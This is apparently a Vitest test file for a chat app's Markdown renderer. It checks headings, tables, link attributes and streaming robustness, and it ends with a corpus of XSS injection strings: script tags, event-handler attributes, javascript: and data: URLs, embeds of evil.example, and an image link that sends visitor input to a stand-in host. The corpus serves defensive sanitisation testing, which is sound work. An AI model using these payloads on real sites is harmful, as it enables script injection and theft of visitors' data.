// @vitest-environment jsdom
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, expect, test } from "vitest";

import { safeHref } from "./links";
import Markdown from "./Markdown";

afterEach(cleanup);

const draw = (text: string) => render(<Markdown text={text} />).container;

test("headings start one level below the chat's title, and lists, quotes and emphasis render", () => {
  const box = draw("# Library\n\n## Hours\n\n- Monday\n- Sunday\n\n> Bring your card.\n\n**Bold** and ~~gone~~");

  expect(box.querySelector("h2")?.textContent).toBe("Library");
  expect(box.querySelector("h3")?.textContent).toBe("Hours");
  expect(box.querySelector("h1")).toBeNull();
  expect(box.querySelectorAll("li")).toHaveLength(2);
  expect(box.querySelector("blockquote")?.textContent?.trim()).toBe("Bring your card.");
  expect(box.querySelector("strong")?.textContent).toBe("Bold");
  expect(box.querySelector("del")?.textContent).toBe("gone");
});

test("a Markdown table becomes a real table with header cells", () => {
  const box = draw("| Room | Floor |\n|---|---|\n| Library | 1 |\n| Gym | 0 |");

  expect([...box.querySelectorAll("th")].map((cell) => cell.textContent)).toEqual(["Room", "Floor"]);
  expect(box.querySelectorAll("tbody tr")).toHaveLength(2);
});

test("a safe link opens in a new tab without giving the page a handle on ours", () => {
  draw("See [the library page](https://college.example/library).");
  const link = screen.getByRole("link", { name: "the library page" });

  expect([link.getAttribute("href"), link.getAttribute("target"), link.getAttribute("rel")]).toEqual([
    "https://college.example/library",
    "_blank",
    "noopener noreferrer nofollow",
  ]);
});

test("an image is never fetched: it becomes a link the visitor can choose to follow", () => {
  const box = draw("![The library at night](https://college.example/library.jpg)");

  expect(box.querySelector("img")).toBeNull();
  expect(screen.getByRole("link", { name: "Image: The library at night" }).getAttribute("href")).toBe(
    "https://college.example/library.jpg",
  );
});

test("a fenced block is shown as labelled code; a diagram fence is labelled as diagram source", () => {
  const box = draw("```python\nprint('hi')\n```\n\n```mermaid\nflowchart LR\n  A --> B\n```");
  const figures = box.querySelectorAll("figure.code");

  expect([...figures].map((figure) => figure.querySelector("figcaption")?.textContent)).toEqual([
    "python",
    "Diagram source",
  ]);
  expect(figures[1]?.querySelector("code")?.textContent).toBe("flowchart LR\n  A --> B");
});

test("half-finished Markdown, as it arrives mid-stream, renders without error", () => {
  const answer = "# Hours\n\n| Day | Open |\n|---|---|\n| Sunday | 10:00 |\n\n```python\nprint('x')\n```\n\nDone.";
  for (let end = 1; end <= answer.length; end++) {
    cleanup();
    expect(() => draw(answer.slice(0, end))).not.toThrow();
  }
});

// The security corpus (M3 security tests): nothing here may run, load or style anything.
const CORPUS = [
  "<script>window.hacked = 1</script>",
  '<img src="x" onerror="window.hacked = 1">',
  "[click](javascript:window.hacked=1)",
  "[click](JaVaScRiPt:window.hacked=1)",
  "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[click](vbscript:msgbox)",
  '<a href="javascript:window.hacked=1">an HTML link</a>',
  "<javascript:window.hacked=1>",
  "[ref]\n\n[ref]: javascript:window.hacked=1",
  '<iframe src="https://evil.example"></iframe>',
  '<svg onload="window.hacked=1"><circle r="1"/></svg>',
  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
  "<style>body { display: none }</style>",
  '<div style="background:url(https://evil.example/x)">styled</div>',
  '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
  "![leak](https://evil.example/collect?secret=what-the-visitor-typed)",
  "![leak](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=)",
  '<details open ontoggle="window.hacked=1">x</details>',
  "```html\n<script>window.hacked = 1</script>\n```",
  "[nested ![img](https://evil.example/a.png)](javascript:window.hacked=1)",
];

test.each(CORPUS)("the injection attempt %j runs, loads and styles nothing", (attempt) => {
  const box = draw(attempt);

  expect(box.querySelectorAll("script, iframe, style, img, svg, object, embed, link, meta")).toHaveLength(0);
  for (const element of box.querySelectorAll("*")) {
    expect([...element.attributes].filter((attribute) => /^on/i.test(attribute.name))).toEqual([]);
    expect(element.getAttribute("style") ?? "").not.toMatch(/url\(|expression|javascript/i);
  }
  for (const link of box.querySelectorAll("a")) expect(safeHref(link.getAttribute("href"))).not.toBeNull();
  expect((window as { hacked?: number }).hacked).toBeUndefined();
});
